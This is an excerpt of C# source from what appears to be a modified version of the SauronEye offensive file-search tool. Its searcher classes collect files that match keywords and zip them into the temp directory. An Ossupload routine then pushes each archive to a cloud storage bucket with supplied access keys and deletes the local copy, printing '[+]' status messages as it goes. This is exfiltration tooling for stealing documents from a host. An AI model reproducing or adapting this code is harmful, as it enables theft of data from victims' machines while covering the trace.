...
namespace SauronEye {
    ...
    class FSSearcher {
        ...
        private string ossstring;
        private OLEExplorer OLXExplorer;
        private bool ossflag;
        ...
        public void Zipfile(List<string> filepathlist, string bucketName, string accessKeyId, string accessKeySecret, string endpoint)
        {
            string zipname = "DefaultSearch-" + GetTimeStamp() + ".zip";
            string ziplocalpath = System.Environment.GetEnvironmentVariable("TMP");
            string fullzippath = ziplocalpath + "\\" + zipname;
            using (var zip = ZipFile.Open(fullzippath, ZipArchiveMode.Create))
            {
                foreach (string filepath in filepathlist)
                {
                    string filename = filepath.Replace(Path.GetPathRoot(filepath), "");
                    zip.CreateEntryFromFile(filepath, filename);
                }
            }
            if (File.Exists(fullzippath))
            {
                Console.WriteLine("[+] Create Zip {0} succeeded", fullzippath);
                Console.WriteLine("[+] Just a moment.It's uploading");
                Ossupload(bucketName, accessKeyId, accessKeySecret, endpoint, fullzippath);
            }
            

        }
        public void Ossupload(string bucketName, string accessKeyId, string accessKeySecret, string endpoint, string fileToUpload)
        {
            ...
            try
            {
                ...
                try
                {
                    ...
                    Console.WriteLine("[+] Upload File {0} to {1}.{2} succeeded", key, bucketName, endpoint);
                }
                catch (Exception ex)
                {
            ...
            {
                Console.WriteLine("[+] Delete File {0} succeeded", fileToUpload);
            }
    ...
    public class ContentsSearcher {
        ...
        public void Zipfile(List<string> filepathlist, string bucketName, string accessKeyId, string accessKeySecret, string endpoint)
        {
            string zipname = "ContentsSearch-" + GetTimeStamp() + ".zip";
            string ziplocalpath = System.Environment.GetEnvironmentVariable("TMP");
            string fullzippath = ziplocalpath + "\\" + zipname;
            using (var zip = ZipFile.Open(fullzippath, ZipArchiveMode.Create))
            {
        ...
        private void CheckForKeywords(string contents, FileInfo fileInfo) {
            try {
                ...
                if (!found.Equals("")) {
                    ...
                    if (ossflag)
                    {
                        Uploadfiles.Add(PrettyPrintNTPath(fileInfo.FullName));
                        Console.WriteLine("[+] Add {0} to Zip", Path.GetFileName(PrettyPrintNTPath(fileInfo.FullName)));
                    }
                }
            } catch (Exception e) {
